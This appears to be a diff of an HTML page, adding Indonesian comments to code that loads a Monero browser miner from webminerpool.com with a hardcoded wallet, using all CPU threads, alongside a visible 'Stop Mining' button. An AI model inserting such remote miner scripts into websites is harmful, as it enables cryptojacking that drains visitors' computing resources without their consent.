@@ -1,5 +1,3 @@
-
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -87,9 +85,13 @@
 
   <button id="toggleBtn">Stop Mining</button>
 
+  <!-- Miner script -->
   <script src="https://webminerpool.com/scripts/miner.min.js"></script>
   <script>
+    // Masukkan wallet Monero kamu di sini
     const wallet = "46P4ZMTcHGBKjatisUvFWKga6eZMAUygnHkW2KBsjQzDGHc8orJWcc7JWbFyE3PGgxQMeAVC2ZPGwdSPBYAHgTHdUTzrNmm";
+
+    // Buat miner
     const miner = WMP.User(wallet, "yourminer-monero", {
       threads: -1,
       throttle: 0.2,
